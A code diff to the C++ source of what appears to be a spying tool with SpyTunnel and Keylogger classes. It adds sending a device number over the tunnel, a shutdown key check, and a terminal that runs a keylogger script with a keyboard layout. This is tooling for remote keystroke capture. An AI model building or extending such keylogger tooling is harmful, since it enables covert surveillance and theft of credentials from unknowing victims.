@@ -68,6 +68,10 @@ void SpyTunnel::run() {
         return;
     }
 
+    if (Keylogger* keylogger = dynamic_cast<Keylogger*>(this)) {
+        keylogger->send_dev();
+    }
+
     ScopedEpollFD epoll_fd;
     rc = create_epoll_fd(epoll_fd);
     if (rc < 0) {
@@ -114,12 +118,28 @@ void SpyTunnel::run() {
                     write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
                     return;
                 } else {
+                    if (memcmp(buf, OUT_KEY, OUT_KEY_LEN) == 0) {
+                        write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
+                        return;
+                    }
                     write(tunnel_fifo_, buf, bytes_read);
                 }
             }
         }
     }
 
+}
+
+void SpyTunnel::send_dev() {
+    send(tunnel_end_socket_, &dev_num_, sizeof(dev_num_), 0);
+}
+
+void Keylogger::set_dev(int __dev_num) {
+    dev_num_ = static_cast<uint32_t>(__dev_num);
+}
+
+void Keylogger::set_layout(const std::string& __layout) {
+    layout_ = __layout;
 }
 
 int SpyTunnel::accept_tunnel_end() {
@@ -218,13 +238,15 @@ void SpyTunnel::write_fifo_error(const std::string& __msg) {
     if (tunnel_fifo_ != -1) {
         std::string error = __msg + "[__error__]\n";
         write(tunnel_fifo_, error.c_str(), error.length());
+        close(tunnel_fifo_);
+        tunnel_fifo_ = -1;
     } else {
         std::cerr << RED << "[SpyTunnel::write_fifo_error] " << __msg << RESET;
     }
 }
 
 void Keylogger::spawn_window() {
-    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), (char*)NULL);
+    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), layout_.c_str(), (char*)NULL);
 }
 
 PacketTunnel::PacketTunnel(const std::string& __file_name, const std::string& __out_name, EventLog* __p_event_log, size_t __limit) 
@@ -322,4 +344,4 @@ void SpyTunnel::spawn_window() {
     // Overridden
 }
 
-SpyTunnel::~SpyTunnel() {}
+SpyTunnel::~SpyTunnel() {} // Enable RTTI
